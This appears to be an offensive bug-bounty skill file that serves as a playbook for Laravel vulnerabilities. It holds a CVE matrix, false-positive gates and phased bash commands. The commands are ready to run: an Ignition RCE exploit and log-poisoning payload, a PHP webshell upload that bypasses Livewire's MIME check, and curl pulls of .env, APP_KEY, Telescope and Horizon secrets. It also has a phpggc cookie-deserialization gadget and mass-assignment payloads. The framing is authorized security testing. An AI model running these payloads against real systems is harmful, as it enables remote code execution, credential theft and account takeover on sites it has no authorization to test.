---
name: hunt-laravel
description: "Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths."
sources: hackerone_public, cve_database
---

# HUNT-LARAVEL — Laravel Specific Vulnerabilities

## Crown Jewel Targets

Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).

**Highest-value findings:**
- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
- **.env / leaked `APP_KEY`** — `APP_KEY` recovered → decrypt all encrypted cookies → forge session → ATO, and (with `SESSION_DRIVER=cookie`) → deserialization RCE

---

## Laravel Version → CVE Matrix (authorized-engagement reference)

Fingerprint the framework version first (Phase 1), then map it to the real disclosed CVEs below. Every entry is a *precondition-gated* bug — the version alone is not a finding; the precondition column is your Gate 0 (see below). Do **not** report a version-match without the precondition proven live.

| CVE / advisory | Component & vulnerable range | Precondition (Gate 0) | Impact |
|---|---|---|---|
| **CVE-2021-3129** | `facade/ignition` < 2.5.2 (Laravel < 8.4.2) | `APP_DEBUG=true` in prod **and** Ignition present **and** writable `storage/logs` | Unauth log-poisoning → RCE |
| **CVE-2024-52301** | Laravel framework: < 6.20.45, 7.x < 7.30.7, 8.x < 8.83.28, 9.x < 9.52.17, 10.x < 10.48.23, 11.x < 11.31.0 | PHP `register_argc_argv=On` (default on many CLI-SAPI/Apache setups) | Env override via `?--env=` query string → switch app to attacker-chosen environment (e.g. force `local`/debug config) |
| **CVE-2018-15133** | Laravel < 5.6.30 (`X-XSRF-TOKEN` / session cookie path) | `APP_KEY` known/recovered | Encrypted-payload `unserialize()` → RCE |
| **CVE-2024-55556** | Laravel with `SESSION_DRIVER=cookie` (the 2018 vector persisting in current versions) | `APP_KEY` known **and** cookie session serialization enabled | Forged encrypted session cookie → `unserialize()` → RCE |
| **CVE-2024-47823** | `livewire/livewire` v2 < 2.12.7, v3 < 3.5.2 (impacts **Filament**, which depends on Livewire) | Upload uses `getClientOriginalName()`, stored on a **public** disk, webserver executes `.php` | MIME-guess extension bypass → webshell → RCE |

**Not a Laravel CVE but constantly conflated:** a plain `/.env` disclosure or a `Whoops`/Ignition debug page is a *finding on its own* (source-leak / info-disclosure) — it is only "RCE" once you actually chain it (Ignition solution call, or `APP_KEY` → deserialization). Keep the severities separate until the chain fires.

---

## Validation & False-Positives (Gate 0)

Run this gate on **every** Laravel finding before it leaves your notes. Framing: authorized engagement, in-scope host, minimal-impact proof (`id`/`whoami` marker, unique OOB token, or read of *your own* forged session), no destructive payloads.

**Gate 0 — the finding is only real if you can answer "yes, right now":**

1. **Version + precondition confirmed live** — you matched a range in the matrix *and* proved the precondition (debug on, `register_argc_argv`, known `APP_KEY`, public upload disk), not just the version banner.
2. **Concrete primitive demonstrated** — command output / OOB callback with a unique marker (RCE), or a forged cookie that returns *another* identity (ATO), or a secret you can actually authenticate with (leak).
3. **Reproducible cold** — one request + payload, no ephemeral state.

**Per-phase FP-killers (kill these before writing anything up):**

- **Ignition (Phase 2):** a visible `Whoops`/Ignition page is **debug-disclosure, not RCE**. RCE requires the `/_ignition/execute-solution` chain to actually write+execute (Ignition < 2.5.2). A 404/`MethodNotAllowed` on `/_ignition/execute-solution`, or a modern `spatie/laravel-ignition` (Laravel 9+) that rejects the `MakeViewVariableOptionalSolution` gadget = **patched → N/A for RCE** (still report the debug page as info-disclosure).
- **CVE-2024-52301 (env manip):** confirm `register_argc_argv=On` — inject `?--env=local` and observe an *actual* environment/behavior change (debug re-enabled, different config path). No observable change ⇒ FP (directive off or already patched to ≥ the fixed release).
- **Telescope/Horizon (Phase 3):** a `200` on `/telescope` that is an **empty shell / login redirect / no live data** is **not** a finding. It is Critical only when a response leaks *live* secrets (real `APP_KEY`, DB creds, user tokens in job payloads). An authed staging instance you were *given* access to is not a disclosure.
- **.env / APP_KEY (Phase 4):** a `200` returning HTML (SPA catch-all route) or a `.env.example` with placeholder values is a **FP**. Require real secret material. A recovered `APP_KEY` is only "RCE" once the deserialization chain (Phase 7) fires or the ATO cookie is accepted — otherwise it is a leak, not RCE.
- **Signed URL (Phase 5):** the app *ignoring* an unrelated extra param is expected Laravel behavior (only signed params are covered by the signature). A real bug = tampering a **signed** param (or dropping `&signature=`) and still getting a `200`/action. A `403 Invalid signature` = working as intended ⇒ FP.
- **Mass assignment (Phase 6):** the request **accepting** `is_admin:true` in JSON is not proof — the model may silently drop non-`$fillable` keys. Proof = re-fetch the record / hit an admin-only route and confirm the privilege actually stuck.
- **Deserialization (Phase 7):** a stack trace, `DecryptException`, or 500 is a sink signal, **never** RCE. Require an OOB callback or command output (see `hunt-deserialization` KILL GATE). A hang/crash is DoS-at-most.

---

## Phase 1 — Fingerprint Laravel

```bash
# Laravel-specific indicators
curl -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

# Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Check error page (trigger 404)
curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"

# Version fingerprint (drives the CVE matrix above)
# composer.lock / composer.json sometimes served; else infer from headers / Ignition banner
curl -s "https://$TARGET/composer.lock" | grep -A2 '"name": "laravel/framework"'
# nuclei has laravel/ignition detection + version templates
nuclei -u "https://$TARGET" -tags laravel,ignition -severity medium,high,critical
```

---

## Phase 2 — Debug Mode & Ignition RCE (CVE-2021-3129)

```bash
# Step 1: Check if debug mode is enabled (Whoops error page)
curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

# If Whoops/Ignition is visible → debug mode ON → test CVE-2021-3129

# Step 2: Check Ignition endpoint
curl -s "https://$TARGET/_ignition/health-check" | head -5

# Step 3: CVE-2021-3129 — facade/ignition < 2.5.2 (Laravel < 8.4.2) RCE via log-file manipulation
# Gate 0: needs APP_DEBUG=true + vulnerable Ignition + writable storage/logs. Modern
# spatie/laravel-ignition (Laravel 9+) rejects this gadget — confirm the version, not just the page.
# Tool: ambionics/laravel-ignition-rce (external clone, not a UBH first-party tool)
git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"

# Manual test — send solution request
curl -s -X POST "https://$TARGET/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
    }
  }'
```

---

## Phase 2.5 — Environment Manipulation via Query String (CVE-2024-52301)

```bash
# Laravel < 6.20.45 / 7.30.7 / 8.83.28 / 9.52.17 / 10.48.23 / 11.31.0
# ONLY exploitable when PHP register_argc_argv=On (common on Apache/CLI-SAPI).
# The framework reads argv from the query string and lets ?--env=X override the environment.

# Baseline the normal environment/behavior first, then force a different env:
curl -s "https://$TARGET/?--env=local"       -o /tmp/env_local.html -w "%{http_code}\n"
curl -s "https://$TARGET/?--env=production"   -o /tmp/env_prod.html  -w "%{http_code}\n"

# FP-killer: diff the two. A REAL hit flips behavior — e.g. debug/error verbosity changes,
# a different config path loads, or a Whoops/Ignition page appears under ?--env=local.
# Identical responses ⇒ register_argc_argv is Off or the app is patched ⇒ N/A.
diff /tmp/env_local.html /tmp/env_prod.html | head -20
```

Impact: forcing `?--env=local` (or any env with looser config) can re-enable debug output, swap in dev credentials/config, or — chained with Ignition (Phase 2) — turn a patched-looking prod host into an RCE surface. See `hunt-source-leak` for the debug-page disclosure this can unlock.

---

## Phase 2.6 — Livewire / Filament Upload RCE (CVE-2024-47823)

```bash
# livewire/livewire v2 < 2.12.7 or v3 < 3.5.2 (Filament depends on Livewire → same flaw).
# Root cause: the uploaded file's extension is GUESSED from MIME type, so a .php file
# sent with Content-Type: image/png can pass validation and land executable.

# Detect Livewire (component markup + the upload endpoint)
curl -s "https://$TARGET/" | grep -io "wire:id\|livewire\|@livewire"
curl -s -o /dev/null -w "%{http_code}\n" "https://$TARGET/livewire/upload-file"

# PoC upload: PHP body, image MIME, original filename preserved server-side.
printf '<?php echo "MARKER_%s"; system($_GET["c"]); ?>' "$RANDOM" > /tmp/shell.php
curl -s -X POST "https://$TARGET/livewire/upload-file" \
  -H "Content-Type: multipart/form-data" \
  -F "files[]=@/tmp/shell.php;type=image/png"

# Gate 0 (all three required): stored on a PUBLIC disk, filename kept via getClientOriginalName(),
# webserver set to run .php. Fetch the stored path and confirm EXECUTION, not just a 200 upload:
curl -s "https://$TARGET/storage/.../shell.php?c=id"   # must return the unique MARKER + `id` output
```

FP-killer: a `200` on the upload alone is not RCE — Livewire may store to a private disk or rename the file. The finding is real only when you fetch the stored `.php` and see your unique marker execute. See `hunt-file-upload` for the broader MIME/extension bypass matrix and `hunt-rce` Chain 3 (upload → webshell).

---

## Phase 3 — Laravel Telescope & Horizon

```bash
# Telescope — request/response logs, DB queries, jobs, cache, events
curl -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
curl -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
curl -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50

# Horizon — queue worker dashboard
curl -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
# Failed job payloads often contain full request data including auth tokens

# Common paths
for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```

---

## Phase 4 — .env File & APP_KEY Exposure

```bash
# Direct .env access
curl -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl -s "https://$TARGET/.env.production"
curl -s "https://$TARGET/.env.backup"
curl -s "https://$TARGET/.env.local"

# Also check public GitHub / historical .git for leaked APP_KEY — the 2025 GitGuardian/Synacktiv
# campaign found 600+ live Laravel apps RCE-able purely from a public APP_KEY (AndroxGh0st abuses this).
# Use gitleaks/trufflehog over the org's repos + git-dumper on any exposed /.git (see hunt-source-leak).

# If APP_KEY found:
APP_KEY="base64:XXXXXXX"
echo "APP_KEY=$APP_KEY"
# → Can decrypt all Laravel encrypted cookies
# → Can forge session cookies → ATO for any user
# → With SESSION_DRIVER=cookie: forge encrypted serialized cookie → unserialize() RCE (CVE-2024-55556)

# Also check
curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
```

---

## Phase 5 — Signed URL Manipulation

```bash
# Laravel signed URLs contain signature param: ?signature=HASH
# Find signed URL endpoints
cat recon/$TARGET/urls.txt | grep "signature="

# Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

# Modify user ID → should fail if properly signed
curl -s "${SIGNED_URL/user=123/user=999}"

# Test signature bypass: remove signature entirely
curl -s "${SIGNED_URL/&signature=VALID_SIG/}"

# Test: does the app validate ALL parameters or just some?
curl -s "${SIGNED_URL}&extra=malicious"
```

---

## Phase 6 — Mass Assignment via Eloquent

```bash
# Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
# Test: add extra fields to update/create requests

# Profile update
curl -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

# Registration
curl -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@new.com", "password": "test123", "verified": true, "admin": 1}'
```

---

## Phase 7 — Laravel Cookie Deserialization

```bash
# Grounding: CVE-2018-15133 (Laravel < 5.6.30) and CVE-2024-55556 (any version with
# SESSION_DRIVER=cookie). Laravel's decrypt() auto-calls unserialize() on the plaintext,
# so a known APP_KEY + a phpggc gadget = RCE. This is the 2025 mass-APP_KEY-leak vector.

# Get the app key (from Phase 4 .env leak, Telescope env dump, or public GitHub)
APP_KEY=$(curl -s "https://$TARGET/.env" | grep "^APP_KEY=" | cut -d= -f2)

# Generate a Laravel gadget with phpggc (external clone, per hunt-deserialization; not a UBH tool)
php phpggc Laravel/RCE9 system 'id' | base64   # pick the chain matching the framework version

# Encrypt+sign the payload with the APP_KEY into a forged cookie, then send it.
# OOB or command-output is the ONLY valid proof (see hunt-deserialization KILL GATE).
```

---

## Chain Table

| Laravel finding | Chain to | Impact |
|----------------|----------|--------|
| Debug mode ON + Ignition < 2.5.2 | CVE-2021-3129 log-poison RCE | Critical RCE |
| Env manip (CVE-2024-52301) + `register_argc_argv` | Force `?--env=local` → re-enable debug → Ignition | Critical (chained) |
| Livewire/Filament < patched (CVE-2024-47823) | MIME-guess upload bypass → webshell | Critical RCE |
| Telescope accessible with live data | Read API keys, DB queries, env vars | High - credential theft |
| Horizon accessible | Read failed job payloads | High - PII/token exfil |
| APP_KEY leaked (.env / public GitHub) | Forge session cookie → ATO | Critical ATO |
| APP_KEY + `SESSION_DRIVER=cookie` (CVE-2024-55556 / 2018-15133) | phpggc gadget → `unserialize()` RCE | Critical RCE |
| Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
| Mass assignment | Set is_admin=true → privilege escalation | Critical |

---

## Severity Ladder

Apply after the finding clears **Validation & False-Positives (Gate 0)** above — that section holds the per-phase FP-killers; do not re-derive them here.

- Ignition RCE (CVE-2021-3129, chain proven): Critical
- APP_KEY → deserialization RCE (CVE-2024-55556 / 2018-15133): Critical
- Livewire/Filament upload RCE (CVE-2024-47823, execution confirmed): Critical
- Mass assignment to admin (privilege actually stuck): Critical
- APP_KEY leak → forged-session ATO: Critical
- Env manipulation (CVE-2024-52301, behavior change observed): High (Critical if chained to RCE)
- Telescope/Horizon leaking live secrets: High
- Debug page / `.env` disclosure with no live secret and no chain: Low–Medium info-disclosure (never "RCE")

---

## Related Skills

- **`hunt-rce`** — Ignition (CVE-2021-3129), the Livewire/Filament upload bug (CVE-2024-47823), and cookie deserialization all terminate in remote code execution; do not re-explain the exec primitives here. Chain primitive: debug mode ON + Ignition < 2.5.2 → `hunt-rce` log-poisoning gadget via `/_ignition/execute-solution`; upload-to-webshell follows `hunt-rce` Chain 3.
- **`hunt-deserialization`** — A leaked `APP_KEY` lets you forge encrypted serialized cookies (Laravel's `decrypt()` auto-`unserialize()`s). Its KILL GATE (OOB/command-output required) is the proof standard for Phase 7 — referenced, not duplicated. Chain primitive: `.env`/Telescope/public-GitHub leaks `APP_KEY` → `hunt-deserialization` phpggc `Laravel/RCE*` chain → forged cookie → RCE (CVE-2024-55556 / CVE-2018-15133).
- **`hunt-ato`** — `APP_KEY` recovery decrypts and forges any session cookie. Chain primitive: leaked `APP_KEY` → forge `laravel_session` for an arbitrary user → account takeover.
- **`hunt-source-leak`** — `.env`, `composer.lock` (version fingerprint for the CVE matrix), `storage/logs/laravel.log`, exposed `.git`, and public-GitHub `APP_KEY` leaks are the primary key/credential surfaces; use its git-dumper/trufflehog/gitleaks recon rather than repeating it here. Chain primitive: `hunt-source-leak` recon surfaces `.env` or a committed `APP_KEY` → pivot to the deserialization (Phase 7) and ATO chains above. Also the home for the standalone debug-page / `.env` info-disclosure finding.
- **`hunt-idor`** — Mass assignment on Eloquent models is the Laravel-specific arm of broken object-level authorization. Chain primitive: mass-assign `is_admin`/`role` on a profile/registration endpoint → privilege escalation.
- **`triage-validation`** — Telescope/Horizon disclosure is only Critical when it leaks live secrets. Chain primitive: run every finding through the 7-Question Gate before reporting.
